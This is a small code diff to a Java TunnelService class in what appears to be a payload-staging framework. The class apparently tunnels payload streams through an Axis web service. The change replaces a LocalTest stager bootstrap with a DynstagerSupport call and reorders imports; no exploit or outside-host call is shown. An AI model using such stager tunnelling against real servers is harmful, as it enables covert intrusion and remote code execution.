@@ -34,6 +34,8 @@
 
 package j2eepayload.axis;
 
+import j2eepayload.dynstager.DynstagerSupport;
+
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PipedInputStream;
@@ -42,11 +44,9 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.NoSuchElementException;
 
+import jtcpfwd.util.PollingHandler;
 import sun.misc.BASE64Decoder;
 import sun.misc.BASE64Encoder;
-
-import javapayload.stager.LocalTest;
-import jtcpfwd.util.PollingHandler;
 
 public class TunnelService extends PayloadService {
 
@@ -167,7 +167,7 @@ public class TunnelService extends PayloadService {
 
 		public void run() {
 			try {
-				new LocalTest(in, out).bootstrap(args, false);
+				DynstagerSupport.run(in, out, args);
 			} catch (Exception ex) {
 				exception = ex;
 			}
